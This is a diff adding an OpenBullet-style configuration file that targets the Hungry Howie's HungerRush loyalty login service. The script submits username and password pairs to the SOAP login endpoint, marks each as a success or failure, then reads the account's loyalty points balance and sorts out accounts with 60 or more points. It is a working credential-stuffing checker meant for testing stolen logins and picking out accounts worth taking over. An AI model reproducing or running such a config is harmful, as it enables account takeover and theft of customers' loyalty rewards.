@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "hungryhowies",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-23T12:24:32.0668818-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://hungryhowies.hungerrush.com/RevService.asmx" 
+  CONTENT "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><cLogin_Json xmlns=\"http://hungerrush.com/api/services\"><request><![CDATA[{\"UserName\":\"<USER>\",\"Password\":\"<PASS>\",\"RevKey\":\"test\",\"Version\":\"\",\"StoreID\":0,\"CompressResponse\":false}]]></request></cLogin_Json></soap:Body></soap:Envelope>" 
+  CONTENTTYPE "text/xml" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"Value\":true" 
+  KEYCHAIN Failure OR 
+    KEY "\"Value\":false" 
+
+REQUEST POST "https://hungryhowies.hungerrush.com/RevService.asmx" 
+  CONTENT "<?xml version=\"1.0\" encoding=\"utf-8\"?><soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><GetLtyCustomerDetails xmlns=\"http://hungerrush.com/api/services\"><request><![CDATA[{\"Email\":\"<USER>\",\"RevKey\":\"test\",\"CompressResponse\":false}]]></request></GetLtyCustomerDetails></soap:Body></soap:Envelope>" 
+  CONTENTTYPE "text/xml" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"PointsBalance\":" ",\"" CreateEmpty=FALSE -> CAP "POINTS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<POINTS>" GreaterThan "59" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<POINTS>" LessThan "60" 
+
